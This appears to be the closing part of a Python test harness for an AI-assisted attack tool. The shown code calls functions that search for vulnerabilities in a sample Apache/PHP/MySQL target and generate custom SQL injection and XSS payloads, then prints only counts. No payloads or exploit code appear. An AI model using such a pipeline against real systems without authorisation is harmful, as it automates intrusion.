    print("--- Testing AI Vulnerability Search ---")
    target_data = {
        'technologies': ['Apache', 'PHP', 'MySQL'],
        'ports': [{'port': 80, 'service': 'http'}, {'port': 3306, 'service': 'mysql'}]
    }
    
    vulnerabilities = await ai_core.search_vulnerabilities(target_data)
    print(f"Found {len(vulnerabilities)} vulnerabilities")
    for vuln in vulnerabilities[:3]:
        print(f"  - {vuln.get('id', 'N/A')}: {vuln.get('description', '')[:50]}...")
    
    # Test custom payload generation
    print("\n--- Testing Custom Payload Generation ---")
    attack_results = {
        'reconnaissance': target_data,
        'web_attacks': {
            'sql_injection': {'vulnerable': False},
            'xss': {'vulnerable': False}
        }
    }
    
    custom_payloads = await ai_core.generate_custom_payloads(attack_results)
    for attack_type, payloads in custom_payloads.items():
        if payloads:
            print(f"  {attack_type}: {len(payloads)} custom payloads generated")

if __name__ == "__main__":
    asyncio.run(main())